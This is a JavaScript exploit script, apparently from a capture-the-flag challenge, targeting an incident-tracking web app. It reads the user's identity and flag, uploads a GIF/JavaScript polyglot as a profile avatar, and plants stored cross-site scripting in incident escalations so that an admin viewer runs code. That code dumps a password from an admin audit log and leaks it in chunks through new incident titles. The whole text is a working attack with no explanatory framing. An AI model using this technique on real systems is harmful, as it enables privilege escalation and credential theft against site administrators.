// Stage 1: developer bot creates escalation with XSS -> admin bot fires XSS
// The admin XSS payload dumps the tail of audit entry 2 (the password)
(async () => {
  var O = self.location.origin;
  var P = function(t) {
    return fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
    }).catch(function() {});
  };

  // Report developer bot identity
  try {
    var me = await (await fetch(O + '/api/me', { credentials: 'same-origin' })).json();
    var u = me.user || {};
    await P('S1|ME|' + u.id + '|' + u.role + '|' + (u.flag || '').slice(0, 50));
  } catch(e) { await P('S1|MEERR|' + e); }

  // The admin XSS avatar should already be uploaded at the known path
  // But let's upload a NEW avatar via the developer account
  // First: create the admin-targeting JS payload
  var adminJS = [
    'GIF89a=1;(async()=>{',
    "var O=self.location.origin;",
    "var P=function(t){return fetch(O+'/api/incidents',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:String(t).slice(0,105),facility:'Meridian-2',severity:'Watch'})}).catch(function(){})};",
    "var r=await fetch(O+'/api/admin/audit?log=2',{credentials:'same-origin'});",
    "var j=await r.json();var e=j.entry||j;var d=e.request_dump||'NULL';",
    "var n=Math.ceil(d.length/80);",
    "for(var i=0;i<n;i++)await P('PW4|'+(i+1)+'/'+n+'|'+d.slice(i*80,(i+1)*80));",
    "await P('PW4|DONE|'+n)})()"
  ].join('');

  // Upload as avatar
  var b64 = btoa(adminJS);
  var avatarUri = 'data:image/gif;base64,' + b64;

  await P('S1|UPLOADING');
  var upRes = await fetch(O + '/api/profile', {
    method: 'POST', credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'Dev Bot', organization: 'AegisCore', avatar: avatarUri })
  });
  var upData = await upRes.json();
  await P('S1|UPLOAD|' + upRes.status + '|' + JSON.stringify(upData).slice(0, 60));

  // Get avatar path
  var meRes = await (await fetch(O + '/api/me', { credentials: 'same-origin' })).json();
  var avatarPath = (meRes.user || {}).avatar || '';
  await P('S1|AVATAR|' + avatarPath);

  if (!avatarPath) {
    await P('S1|ERR|no avatar path');
    return;
  }

  // Escalate original incidents with XSS pointing to our avatar
  // The escalation details must NOT contain double quotes
  var xss = '<script src=' + avatarPath + '></script>';
  await P('S1|XSS|' + xss.slice(0, 80));

  // Try escalating the original seed incidents
  for (var incId of [1, 2, 3]) {
    try {
      var escRes = await fetch(O + '/api/incidents/' + incId + '/escalate', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ details: xss })
      });
      var escData = await escRes.json();
      await P('S1|ESC|' + incId + '|' + escRes.status + '|' + JSON.stringify(escData).slice(0, 50));
    } catch(e) { await P('S1|ESCERR|' + incId + '|' + e); }
  }

  // Also create new incidents and escalate them
  for (var i = 0; i < 2; i++) {
    try {
      var newRes = await fetch(O + '/api/incidents', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'Stage1 probe ' + i, facility: 'Meridian-2', severity: 'Watch' })
      });
      var newData = await newRes.json();
      // Get the incident id from the list
      var listRes = await (await fetch(O + '/api/incidents', { credentials: 'same-origin' })).json();
      var myInc = (listRes.incidents || []).find(function(x) { return x.title === 'Stage1 probe ' + i; });
      if (myInc) {
        var esc2 = await fetch(O + '/api/incidents/' + myInc.id + '/escalate', {
          method: 'POST', credentials: 'same-origin',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ details: xss })
        });
        await P('S1|ESC2|' + myInc.id + '|' + esc2.status);
      }
    } catch(e) { await P('S1|NESCERR|' + e); }
  }

  await P('S1|DONE');
})();
